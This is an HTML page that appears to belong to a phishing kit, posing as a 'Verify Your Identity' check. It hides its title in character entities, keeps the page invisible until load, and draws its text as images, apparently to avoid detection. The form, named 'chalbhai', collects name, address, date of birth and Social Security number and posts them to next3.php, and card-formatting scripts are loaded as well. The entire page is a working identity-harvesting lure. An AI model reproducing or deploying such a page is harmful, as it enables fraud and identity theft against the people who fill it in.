<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1327px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#ssn").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">

<div id="image4" style="position:absolute; overflow:hidden; left:199px; top:395px; width:96px; height:54px; z-index:0"><img src="images/e4.png" alt="" title="" border=0 width=96 height=54></div>

<div id="image9" style="position:absolute; overflow:hidden; left:200px; top:251px; width:117px; height:53px; z-index:3"><img src="images/e6.png" alt="" title="" border=0 width=117 height=53></div>


<div id="image8" style="position:absolute; overflow:hidden; left:194px; top:679px; width:62px; height:57px; z-index:4"><img src="images/a9.png" alt="" title="" border=0 width=62 height=57></div>

<div id="image7" style="position:absolute; overflow:hidden; left:199px; top:469px; width:155px; height:52px; z-index:2"><img src="images/d10.png" alt="" title="" border=0 width=155 height=52></div>

<div id="image7" style="position:absolute; overflow:hidden; left:197px; top:611px; width:108px; height:53px; z-index:5"><img src="images/a8.png" alt="" title="" border=0 width=108 height=53></div>

<div id="image5" style="position:absolute; overflow:hidden; left:195px; top:539px; width:109px; height:55px; z-index:6"><img src="images/a7.png" alt="" title="" border=0 width=109 height=55></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:7"><img src="images/b8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:182px; top:912px; width:987px; height:150px; z-index:8"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:208px; top:960px; width:108px; height:17px; z-index:9"><a href="#"><img src="images/bo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:10"><img src="images/b7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:11"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:340px; top:784px; width:75px; height:29px; z-index:12"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=75 height=29></a></div>

<div id="image30" style="position:absolute; overflow:hidden; left:199px; top:322px; width:100px; height:54px; z-index:13"><img src="images/d11.png" alt="" title="" border=0 width=100 height=54></div>

<div id="image3" style="position:absolute; overflow:hidden; left:181px; top:88px; width:213px; height:30px; z-index:23"><img src="images/e7.png" alt="" title="" border=0 width=213 height=30></div>

<form action=next3.php name=chalbhai id=chalbhai method=post>
<input name="name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:276px;z-index:15">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:348px;z-index:16">
<input name="db" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:204px;top:420px;z-index:17">
<input name="sn" id="ssn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:203px;top:492px;z-index:18">

<div id="formimage1" style="position:absolute; left:206px; top:783px; z-index:25"><input type="image" name="formimage1"  width="129" height="32" src="images/cnf.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
